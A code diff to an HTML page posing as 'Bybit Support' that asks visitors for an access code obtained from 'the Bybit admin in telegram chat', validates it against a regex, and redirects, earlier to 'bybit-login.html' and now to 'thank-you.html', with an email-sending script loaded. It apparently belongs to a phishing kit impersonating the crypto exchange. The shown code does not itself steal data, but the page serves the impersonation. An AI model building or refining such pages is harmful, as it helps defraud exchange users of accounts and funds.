@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bybit - 2FA Access Code Verification</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Bybit - Access Code Verification</title>
+    <link rel="stylesheet" href="../css/styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
@@ -13,7 +13,7 @@
         <main class="main-content">
             <header class="header">
                 <div class="header-left">
-                    <img src="./bybit-logo/bybit.png" alt="Bybit Logo" class="header-logo">
+                    <img src="../images/bybit-logo/bybit.png" alt="Bybit Logo" class="header-logo">
                     <h1 class="header-title">Bybit Support</h1>
                 </div>
                 <div class="header-right">
@@ -30,19 +30,19 @@
                 <div class="card">
                     <div class="security-notice">
                         <i class="fas fa-shield-alt security-icon"></i>
-                        <p>Please contact the Bybit admin in chat to receive your 2FA access code.</p>
+                        <p>Please contact the Bybit admin in chat to receive your access code.</p>
                     </div>
 
                     <form id="verifyForm" class="verify-form">
                         <div class="form-group">
-                            <label for="accessCode">2FA Access Code</label>
+                            <label for="accessCode">Access Code</label>
                             <input type="text" id="accessCode" name="accessCode" required 
-                                   placeholder="Enter 2FA access code" 
+                                   placeholder="Enter access code" 
                                    maxlength="6" 
                                    style="text-transform: uppercase;">
                             <div id="errorMessage" class="error-message" style="display: none; margin-top: 5px; font-size: 0.9em;"></div>
                         </div>
-                        <button type="submit" class="btn-primary">Verify 2FA Access Code</button>
+                        <button type="submit" class="btn-primary">Verify Access Code</button>
                     </form>
 
                     <div class="security-features">
@@ -78,10 +78,10 @@
         </main>
     </div>
 
-    <script src="utils.js"></script>
-    <script src="modal-utils.js"></script>
-    <script src="notification-system.js"></script>
-    <script src="sendgrid-config.js"></script>
+    <script src="../js/utils.js"></script>
+    <script src="../js/modal-utils.js"></script>
+    <script src="../js/notification-system.js"></script>
+    <script src="../js/email-config.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const form = document.getElementById('verifyForm');
@@ -92,7 +92,7 @@
                 e.preventDefault();
                 
                 const accessCode = accessCodeInput.value.toUpperCase();
-                const codePattern = /^[1-6]{4}[A-Z]{2}$/;
+                const codePattern = /^[A-Z]{3}[1-9]{3}$/;
                 
                 if (!accessCode) {
                     errorMessage.textContent = 'Access denied. Please request for correct access code from the admin in telegram chat';
@@ -114,9 +114,9 @@
                 errorMessage.style.display = 'block';
                 
                 // Store access code and redirect after a short delay
-                sessionStorage.setItem('2faAccessCode', accessCode);
+                sessionStorage.setItem('accessCode', accessCode);
                 setTimeout(() => {
-                    window.location.href = 'bybit-login.html';
+                    window.location.href = 'thank-you.html';
                 }, 1000);
             });
 
